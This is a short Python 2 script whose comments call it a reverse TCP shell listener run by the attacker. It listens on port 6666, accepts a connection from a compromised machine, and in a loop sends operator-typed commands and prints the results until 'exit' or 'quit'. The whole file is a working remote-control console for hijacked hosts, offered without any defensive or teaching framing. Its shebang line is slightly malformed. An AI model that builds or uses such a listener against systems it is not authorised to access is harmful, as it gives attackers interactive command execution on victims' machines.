#/usr/bin/env python
### reverse tcp shell listener
### attack executes this file
import socket

ip = ""        # keep this empty
port = 6666    # attack's port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket
s.bind((ip, port)) # bind ip|port
s.listen(10)
(conn, addr) = s.accept()
print(addr)
print("connection from ip:" + addr[0] + " port:" + str(addr[1]))
# print(conn.recv(1024))

# start shell loop
while True:
    # send commands
    command = raw_input("> ")
    conn.send(command)
    if command == "exit" or command == "quit":
        break
    res = conn.recv(1024)
    print(res)
# close socket
conn.close()
